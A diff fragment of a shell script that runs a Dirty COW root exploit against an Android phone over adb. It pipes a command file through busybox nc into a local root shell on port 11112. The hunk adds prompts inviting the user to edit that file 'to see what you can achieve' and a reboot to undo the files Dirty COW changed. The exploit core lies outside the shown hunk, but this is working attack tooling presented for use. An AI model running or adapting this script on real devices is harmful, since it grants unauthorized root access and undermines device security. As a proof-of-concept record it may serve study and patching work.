@@ -51,13 +51,21 @@ echo [*] OPENING A ROOT SHELL ON THE NEWLY CREATED SYSTEM_SERVER
 echo [*] CREATE A NEW DIRECTORY AS A TEST
 echo [*] CHANGING PERMISSIONS ON NEW DIRECTORY
 adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/cp_comands.txt"
+echo [*]  
+echo --------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
+echo [*] THERE WAS THE PROOF OF CONCEPT
+echo [*] NOW YOU CAN MODIFY THE cp_comands.txt AND START OVER TO SEE WHAT YOU CAN ACHIVE
 echo -n "to continue press [enter]: "
 read start
 clear
 echo [*]  
 echo --------------------------------------------------------------------------------------------
 echo --------------------------------------------------------------------------------------------
-echo [*] PRESS ENTER KEY TO FINISH THIS SCRIPT.
+echo [*] NOW WE REBOOT PHONE TO RESET THE FILES DIRTYCOW CHANGED
+echo [*] 
+echo [*] PRESS ENTER KEY TO FINISH THIS SCRIPT AND REBOOT TO RESTORE PHONE
 echo -n "to continue press [enter]: "
 read start
+adb reboot
 exit
